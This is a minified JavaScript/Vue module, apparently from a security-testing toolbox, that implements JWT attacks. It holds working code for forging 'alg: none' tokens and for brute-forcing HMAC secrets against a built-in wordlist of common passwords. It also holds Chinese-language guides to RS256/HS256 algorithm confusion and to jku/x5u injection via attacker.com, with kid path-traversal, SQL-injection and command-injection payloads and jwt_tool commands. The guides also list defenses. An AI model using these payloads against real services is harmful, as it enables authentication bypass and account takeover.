import{u as M,i as L}from"./action-OibaHbTk.js";import{l as V,ay as N,Q as z,I as g,J as l,A as f,H as j,y,u as e,z as B,E as U,L as T,C as h,K as m,O as I,D as O,G as A,h as W,ap as P}from"./vendor-D2QpS8Sq.js";import{_ as X}from"./tool-Cn6uY8bI.js";import"./vendor-lodash-BDISS5yc.js";import"./modulepreload-polyfill-B5Qt9EMX.js";import"./vendor-monaco-CZQ85J0D.js";function q(_){const a=new TextEncoder().encode(_);let o="";for(const k of a)o+=String.fromCharCode(k);return btoa(o).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}function D(_){let a=_.replace(/-/g,"+").replace(/_/g,"/");const o=a.length%4;return o===2?a+="==":o===3&&(a+="="),atob(a)}function F(_){const a=_.split(".");if(a.length!==3)throw new Error("无效的 JWT 格式，需要三段式结构 (header.payload.signature)");const o=D(a[0]),k=JSON.parse(o);return k.alg="none",`${q(JSON.stringify(k))}.${a[1]}.`}const G=["secret","password","123456","admin","key","test","jwt","token","changeme","P@ssw0rd","1234567890","12345678","123456789","qwerty","abc123","password1","password123","admin123","root","toor","jwt_secret","jwt-secret","jwt_token","jwt_key","jwtkey","jwtsecret","my-secret","my_secret","mysecret","my-jwt-secret","super-secret","super_secret","supersecret","default","default_secret","your-256-bit-secret","your-secret-key","your_secret_key","secretkey","secret_key","secret-key","signing-key","signing_key","signingkey","privatekey","private_key","private-key","public","hmac-secret","hmac_secret","CHANGEME","ChangeMe","change_me","TODO_CHANGE","REPLACE_ME","xxx","placeholder","development","production","staging","hello","world","helloworld","hello123","letmein","welcome","welcome1","iloveyou","trustno1","master","shadow","sunshine","football","monkey","dragon","baseball","company","project","application","app_secret","app-secret","appsecret","api_key","api-key","apikey","apisecret","api_secret","api-secret","node","nodejs","express","flask","django","spring","laravel","auth","auth_secret","authentication","authorization","security","encryption","access","access_token","00000000-0000-0000-0000-000000000000","aaaa","aaaaaa","aaaaaaaa","aaaaaaaaaaaaaaaa","aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","000000","111111","1234","12345","654321","123123","112233","abcdef","abcdefg","abcdefgh","qwerty123","qwertyuiop","asdfghjkl","zxcvbnm","1qaz2wsx","qazwsx","p@ssw0rd","P@ss1234","Admin@123","admin@123","Test@123","test@123","Pass@word1","Passw0rd!"];async function Q(_,a){const o=_.split(".");if(o.length!==3)return!1;try{const k=D(o[0]),d=JSON.parse(k).alg,s={HS256:"SHA-256",HS384:"SHA-384",HS512:"SHA-512"}[d];if(!s)return!1;const b=new TextEncoder,J=`${o[0]}.${o[1]}`,H=await crypto.subtle.importKey("raw",b.encode(a),{name:"HMAC",hash:s},!1,["sign"]),C=await crypto.subtle.sign("HMAC",H,b.encode(J)),$=new Uint8Array(C);let S="";for(const n of $)S+=String.fromCharCode(n);return btoa(S).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")===o[2]}catch{return!1}}function Z(){return`=== RS256 → HS256 算法混淆攻击 ===

【原理】
服务端使用 RS256 验证 JWT 时依赖公钥/私钥对：
  - 签名使用私钥（服务端持有）
  - 验签使用公钥（可公开获取）

如果 JWT 库在验证时 alg=HS256 也使用同一个"公钥"作为 HMAC 密钥，
攻击者可以获取公钥后用它做 HMAC 签名，伪造任意 token。

【攻击步骤】
1. 获取服务端的 RSA 公钥（通常可从 /jwks.json、/.well-known/jwks.json 等端点获取）
2. 将 JWT header 中的 "alg" 从 "RS256" 改为 "HS256"
3. 修改 payload 中的声明（如提升权限、修改用户 ID）
4. 使用获取到的 RSA 公钥文件内容作为 HMAC-SHA256 的密钥，对 header.payload 签名
5. 组装成新的 JWT: base64url(header).base64url(payload).base64url(signature)

【命令示例（使用 jwt_tool）】
python3 jwt_tool.py <JWT> -X k -pk public.pem

【防御措施】
- 服务端验证时明确指定允许的算法列表，不接受 none 和非预期算法
- 使用严格的 JWT 库（如 jose、jsonwebtoken 的 algorithms 白名单）
- 分离对称和非对称密钥的验证逻辑`}function Y(){return`=== JKU / X5U Header 注入攻击 ===

【原理】
JWT header 支持以下密钥来源字段：
  - jku (JWK Set URL): 指向 JSON Web Key Set 的 URL
  - x5u (X.509 URL): 指向 X.509 证书链的 URL
  - kid (Key ID): 指定使用哪个密钥

如果服务端在验签时直接请求 jku/x5u 中的 URL 获取密钥，
且未对 URL 进行白名单校验，攻击者可以：

【JKU 注入步骤】
1. 生成自己的 RSA 密钥对
2. 在攻击者服务器上部署 JWKS 端点，包含自己的公钥
3. 修改 JWT header，将 jku 指向攻击者的 JWKS 端点
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "https://attacker.com/.well-known/jwks.json"
   }
4. 用自己的私钥对篡改后的 payload 签名
5. 发送伪造的 JWT

【X5U 注入步骤】
1. 生成自签名 X.509 证书
2. 在攻击者服务器上部署证书
3. 修改 JWT header，将 x5u 指向攻击者的证书 URL
   {
     "alg": "RS256",
     "typ": "JWT",
     "x5u": "https://attacker.com/cert.pem"
   }
4. 用对应私钥签名

【KID 注入变体】
kid 字段有时用于文件路径或数据库查询，可能存在：
  - 路径遍历: {"kid": "../../dev/null"}（使空密钥签名）
  - SQL 注入: {"kid": "key' UNION SELECT 'secret' -- "}
  - 命令注入: {"kid": "key|whoami"}

【命令示例（使用 jwt_tool）】
python3 jwt_tool.py <JWT> -X s -ju https://attacker.com/jwks.json

【防御措施】
- 白名单限制 jku/x5u 的 URL 来源域名
- 不使用外部 URL 获取密钥，改用本地配置
- 对 kid 字段进行严格的输入验证和过滤
- 禁用不需要的 header 参数`}const ee={class:"sectool-jwt-attacks-section-title"},te={class:"sectool-jwt-attacks-section-title"},ae={key:0,class:"sectool-jwt-attacks-progress"},oe={class:"sectool-jwt-attacks-progress-text"},se={class:"sectool-jwt-attacks-section-title"},re={class:"sectool-jwt-attacks-section-title"},K=10,ne=V({__name:"Attacks",async setup(_){let a,o;const k=A(()=>[{value:"none_algorithm",label:$t("jwt_attack_none_alg")},{value:"brute_force",label:$t("jwt_attack_brute_force")},{value:"rs256_hs256",label:$t("jwt_attack_rs256_hs256")},{value:"jku_injection",label:$t("jwt_attack_jku_injection")}]),t=M(([a,o]=N(()=>L({attackType:"none_algorithm",token:"",customKeys:""},{paste:!1})),a=await a,o(),a));let d=W(!1),c=W(""),s=W({tried:0,total:0});const b=Z(),J=Y(),H=A(()=>d.value?"sectool-jwt-attacks-status--running":c.value?"sectool-jwt-attacks-status--found":"sectool-jwt-attacks-status--idle"),C=A(()=>d.value?$t("jwt_attack_brute_force_running",[s.value.total]):c.value?$t("jwt_attack_brute_force_found",[c.value]):s.value.total>0?$t("jwt_attack_brute_force_not_found",[s.value.tried]):""),$=A(()=>s.value.total<=0?0:Math.round(s.value.tried/s.value.total*100));async function S(){const r=t.current.token.trim(),n=t.current.attackType;if(c.value="",s.value={tried:0,total:0},!(!r&&n!=="rs256_hs256"&&n!=="jku_injection"))switch(n){case"none_algorithm":{try{c.value=F(r),t.save()}catch(v){c.value=$error(v)}break}case"brute_force":{if(!r)return;d.value=!0;const v=t.current.customKeys.split(`
`).map(u=>u.trim()).filter(Boolean),i=[...G,...v];s.value={tried:0,total:i.length};for(let u=0;u<i.length;u+=K){const R=i.slice(u,u+K);for(const w of R){const x=await Q(r,w);if(s.value={tried:s.value.tried+1,total:i.length},x){c.value=w,d.value=!1,t.save();return}}await new Promise(w=>setTimeout(w,0))}d.value=!1,t.save();break}}}return(r,n)=>{const v=j("Select"),i=j("Textarea"),u=j("Align"),R=j("Button"),w=j("Display"),x=j("HeightResize"),E=P("row");return z((y(),g("div",null,[l(u,{direction:"vertical"},{default:f(()=>[l(w,null,{extra:f(()=>[l(R,{type:"primary",text:r.$t("main_ui_submit"),loading:e(d),onClick:S},null,8,["text","loading"])]),default:f(()=>[l(u,{direction:"vertical"},{default:f(()=>[l(v,{modelValue:e(t).current.attackType,"onUpdate:modelValue":n[0]||(n[0]=p=>e(t).current.attackType=p),label:r.$t("jwt_attack_type"),options:k.value},null,8,["modelValue","label","options"]),l(i,{modelValue:e(t).current.token,"onUpdate:modelValue":n[1]||(n[1]=p=>e(t).current.token=p),height:120,placeholder:r.$t("jwt_attack_token_placeholder")},null,8,["modelValue","placeholder"]),e(t).current.attackType==="brute_force"?(y(),B(i,{key:0,modelValue:e(t).current.customKeys,"onUpdate:modelValue":n[2]||(n[2]=p=>e(t).current.customKeys=p),height:80,placeholder:r.$t("jwt_attack_brute_force_custom_placeholder")},null,8,["modelValue","placeholder"])):U("",!0)]),_:1})]),_:1})]),_:1}),l(x,null,{default:f(({height:p})=>[l(u,{direction:"vertical",class:"sectool-jwt-attacks-output"},{default:f(()=>[e(t).current.attackType==="none_algorithm"?(y(),g(T,{key:0},[h("div",ee,m(r.$t("jwt_attack_none_result")),1),l(i,{"model-value":e(c),height:Math.max(p-40,200),placeholder:r.$t("jwt_attack_result"),copy:""},null,8,["model-value","height","placeholder"])],64)):e(t).current.attackType==="brute_force"?(y(),g(T,{key:1},[h("div",te,m(r.$t("jwt_attack_result")),1),h("div",{class:I(["sectool-jwt-attacks-status",H.value])},m(C.value),3),e(d)||e(s).total>0?(y(),g("div",ae,[h("div",{class:"sectool-jwt-attacks-progress-bar",style:O({width:$.value+"%"})},null,4),h("span",oe,m(e(s).tried)+" / "+m(e(s).total),1)])):U("",!0),l(i,{"model-value":e(c),height:Math.max(p-120,150),placeholder:r.$t("jwt_attack_result"),copy:e(c)?"key":void 0},null,8,["model-value","height","placeholder","copy"])],64)):e(t).current.attackType==="rs256_hs256"?(y(),g(T,{key:2},[h("div",se,m(r.$t("jwt_attack_description")),1),l(i,{"model-value":e(b),height:Math.max(p-40,400),readonly:""},null,8,["model-value","height"])],64)):e(t).current.attackType==="jku_injection"?(y(),g(T,{key:3},[h("div",re,m(r.$t("jwt_attack_description")),1),l(i,{"model-value":e(J),height:Math.max(p-40,400),readonly:""},null,8,["model-value","height"])],64)):U("",!0)]),_:2},1024)]),_:1})])),[[E,"10-14"]])}}}),_e=X(ne,[["__scopeId","data-v-9584b087"]]);export{_e as default};
